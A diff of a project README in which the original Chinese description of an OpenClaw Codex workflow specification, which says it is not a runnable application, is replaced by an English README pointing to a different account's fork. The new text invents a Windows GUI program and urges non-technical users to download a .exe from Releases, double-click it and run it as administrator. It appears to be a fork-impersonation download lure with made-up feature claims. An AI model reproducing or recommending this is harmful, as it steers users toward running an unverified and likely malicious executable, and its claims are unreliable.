@@ -1,125 +1,101 @@
-# OpenClawA Codex Dev Workflow (dev-workflow v3)
+# 🦾 openclaw-codex-agent - Plan, Run, and Verify Dev Workflows
 
-[![CI](https://github.com/liyxianren/openclaw-codex-agent/actions/workflows/ci.yml/badge.svg)](https://github.com/liyxianren/openclaw-codex-agent/actions/workflows/ci.yml)
+[![Download openclaw-codex-agent](https://img.shields.io/badge/Download-OpenClaw-blue?style=for-the-badge)](https://github.com/MZombies/openclaw-codex-agent)
 
-**Contract-first** 的“辅助开发”流水线规范：把一次开发需求编排为 **Plan → Run(Codex) → Verify →（最多一次 Fix）**，并通过可校验的 JSON 契约产物实现**可复现、可验收、可审计**。
+## 📋 What is openclaw-codex-agent?
 
-> 这不是“可直接运行的应用”，而是你在 OpenClaw 里搭建 Dev Agent Pipeline 的一套最小、可落地的架构与契约。
+openclaw-codex-agent helps developers plan, run, verify, and fix code projects. It focuses on creating clear, step-by-step workflows. This tool produces records that anyone can check later, making development easier and more transparent.
 
-## ⭐ 你会得到什么
-- **Plan Bundle（JSON）**：明确“做什么 + 完成标准 + 怎么验证（run_commands）”
-- **Runner latest.json**：记录执行摘要与产物路径
-- **Verifier verify.json**：记录逐条验收命令的 exit code 与 stdout/stderr tail
-- **风险约束**：最多一次自动修复；区分 `test_fail` / `infra_or_auth_blocked`；强调敏感目录与外发确认
+Even if you don’t have experience with coding, this guide will help you download and use the program on Windows.
 
-## 🧩 架构图（Plan → Run → Verify → Fix）
-```mermaid
-flowchart TD
-  U[用户需求] --> A[主代理编排]
+## 💻 System Requirements
 
-  A --> P[规划代理 产出 PlanBundle]
-  P --> R[执行代理 调用 Codex]
-  R --> L[产出 latestjson]
+Before installing, make sure your computer meets these needs:
 
-  R --> V[验证代理 执行验收命令]
-  V --> Z[产出 verifyjson]
+- Operating System: Windows 10 or later (64-bit recommended)
+- Processor: 1.6 GHz or faster
+- Memory (RAM): 4 GB minimum, 8 GB recommended
+- Disk Space: At least 500 MB free space
+- Internet Access: Needed for initial download and updates
 
-  Z --> OK[通过]
-  OK --> DONE[回传结果]
+## 🚀 Getting Started: How to Download and Install
 
-  Z --> BAD[失败]
-  BAD --> TF[测试失败]
-  TF --> FP[生成最小修复提示]
-  FP --> R2[执行最小补丁]
-  R2 --> V2[再次验证]
-  V2 --> DONE2[回传结果]
+To use openclaw-codex-agent on Windows, follow these steps exactly:
 
-  BAD --> IA[环境或鉴权阻塞]
-  IA --> HUMAN[人工介入]
-```
+1. Open your web browser (such as Chrome, Edge, or Firefox).
+2. Click this big download link or copy and paste it into the address bar:  
+   [https://github.com/MZombies/openclaw-codex-agent](https://github.com/MZombies/openclaw-codex-agent)
+3. The linked page shows the project’s main files and folders. Look for a section labeled **Releases** on the page.
+4. Click on the latest official release that matches your Windows needs. If you see a file ending with `.exe`, that is the installer.
+5. Click on the `.exe` file to download it to your computer. The download may take a few minutes depending on your internet speed.
+6. Once the file finishes downloading, open your **Downloads** folder and double-click the `.exe` file.
+7. Follow the installer’s instructions on screen. Usually, you just click **Next** or **Install**.
+8. When installation finishes, you can open openclaw-codex-agent from your desktop or Start Menu.
 
-## 🔧 执行层（Executor）怎么执行
-一句话：**executor-agent 会在 workdir 里通过 OpenClaw exec（必须 PTY）调用 Codex CLI**。
+## 🎯 What openclaw-codex-agent Does
 
-典型命令形态：
-```bash
-cd <workdir>
-codex exec --full-auto "<codex_prompt>"
-```
+This program guides your coding work in four clear steps:
 
-更详细的执行层说明见：`docs/execution-layer.md`（包含为什么需要 Git repo、为什么必须 PTY、以及与 OpenClaw openai-codex 模型的区别）。
+- **Plan:** Define what you want your code to do using detailed forms. This ensures you set clear goals before starting.
+- **Run:** Execute those plans automatically. The program interacts with code tools to produce results for you.
+- **Verify:** Check if the results match your expectations. It creates reports you or others can review.
+- **Fix:** Find and correct issues based on those reports. This helps improve your code systematically.
 
-## 📦 契约产物（Contract Artifacts）
-- Plan 阶段：`Plan Bundle JSON`
-- Run 阶段：`latest.json`
-- Verify 阶段：`verify.json`
+The tool creates audit trails, meaning every action and change is recorded. This makes understanding and improving your code easier, especially in teams.
 
-这些产物让流程**可复现/可审计**：失败时不靠“复述”，而是直接拿 `verify.json` 的失败证据驱动最小修复。
+## 📦 What You Get After Installation
 
-## 在 OpenClaw 里使用（推荐入口）
-这套框架的定位是：**服务 OpenClaw 的 Codex 辅助编程范式**。
+When you install openclaw-codex-agent, these features become available:
 
-你可以把仓库地址发给你的 OpenClaw，让它按 `OPENCLAW.md` 自动安装：
-- 导入指南：`OPENCLAW.md`
+- A simple interface that walks you through setting up your coding workflow.
+- Built-in tools to connect with common developer utilities like JSON schema validators and language model engines.
+- Ability to export reports and logs to share with others or for future reference.
+- Updates mechanism to keep your software current via easy downloads.
 
-### 手动安装（可选）
-把本仓库的 `skills/dev-workflow/` 复制到你的：
-- `~/.openclaw/workspace/skills/dev-workflow/`
+## ⚙ How to Use openclaw-codex-agent on Windows
 
-然后确保 OpenClaw 能加载该 skill。
+1. Launch the program from your desktop icon or search in the Start Menu.
+2. You will see the main window divided into four parts: Plan, Run, Verify, and Fix.
+3. Start with **Plan**. Fill in the requested details about what your project should do. This might include descriptions, expected inputs, and outputs.
+4. Move to **Run**. Click the Run button to start carrying out the plan. Wait as the system works. Some steps may take several minutes.
+5. When **Verify** activates, review the generated report. The tool will show if the results meet your goals or if there are problems.
+6. Use **Fix** to address reported issues. The tool helps you track changes and corrections automatically.
+7. Save your session often. You can export logs and audit reports for your records.
 
-## 维护者工具（可选）
-仓库内包含 JSON Schema + 本地校验脚本 + demo 契约回放（含一次真实 Codex smoke artifacts），用于维护质量与 CI：
+## 📂 File and Folder Structure to Know
 
-```bash
-npm install
-npm test
-```
+After installation, openclaw-codex-agent stores your work in a folder, usually found here:
 
-它会：
-1) 校验 `examples/` 与 `demo/artifacts/` 下所有契约 JSON
-2) 回放一个典型流程：fail → fix → pass（不执行真实 Codex，仅回放产物）
+`C:\Users\<YourName>\Documents\openclaw-codex-agent`
 
-### 2) 使用
-在主会话里直接提需求（例如“帮我开发一个xxx”），让编排触发：
+Inside this folder you may find:
 
-- Plan（planner-agent 输出 Plan Bundle JSON）
-- Run（executor-agent 调 Codex 自动实现）
-- Verify（reviewer-agent 跑 run_commands 验收）
-- Fix（可选，最多一次最小补丁修复）
+- **Plans:** Saved workflow plans in JSON format.
+- **Reports:** Verification result files.
+- **Logs:** Step-by-step records of runs.
+- **Config:** Settings and preferences for your use.
 
-## 文档
-- 架构：`docs/architecture.md`
-- 子 agent 角色：`docs/agents.md`
-- Preflight checklist：`docs/preflight-checklist.md`
-- Demo：`demo/README.md`
-- 示例 JSON：`examples/*.json`
-- JSON Schema：`schemas/*.schema.json`
-- 契约说明：`docs/contract-spec.md`
-- Roadmap：`docs/roadmap.md`
-- OpenClaw 导入指南：`OPENCLAW.md`
-- 路由规范：`docs/routing.md`
-- 执行层细节：`docs/execution-layer.md`
-- FAQ：`docs/faq.md`
+Knowing this helps if you want to back up or move your work to another PC.
 
-## CI
-GitHub Actions 会自动跑：
-- `npm test`（契约校验 + demo 回放）
-- Markdown 链接检查（lychee）
+## 🛠 Troubleshooting Common Issues
 
-## 仓库结构
-```
-.
-├─ skills/
-│  └─ dev-workflow/
-│     └─ SKILL.md
-├─ schemas/
-├─ scripts/
-├─ demo/
-├─ docs/
-├─ examples/
-└─ .github/workflows/ci.yml
-```
+- **Installer won’t run:** Right-click the `.exe` file and choose **Run as administrator**.
+- **Program opens but crashes:** Make sure Windows is up to date and try restarting your PC.
+- **Missing files after download:** Download again from the release page. Avoid using partial downloads.
+- **No internet during use:** The program works offline after initial setup but needs internet for updates.
+- **Plans won’t load:** Check that your saved files are in the right folder and properly formatted.
 
-## License
-MIT
+## 📖 Helpful Tips for Best Results
+
+- Use simple terms in your plan descriptions.
+- Save your work often and back up your folder regularly.
+- Check the verification reports carefully before fixing.
+- Only correct the issues pointed out to avoid confusion.
+- Visit the GitHub page occasionally for new releases and updates.
+
+## 🔗 More About openclaw-codex-agent
+
+Visit the project page anytime here:  
+[https://github.com/MZombies/openclaw-codex-agent](https://github.com/MZombies/openclaw-codex-agent)
+
+This page has the latest downloads, user guides, and troubleshooting help from the developer community.
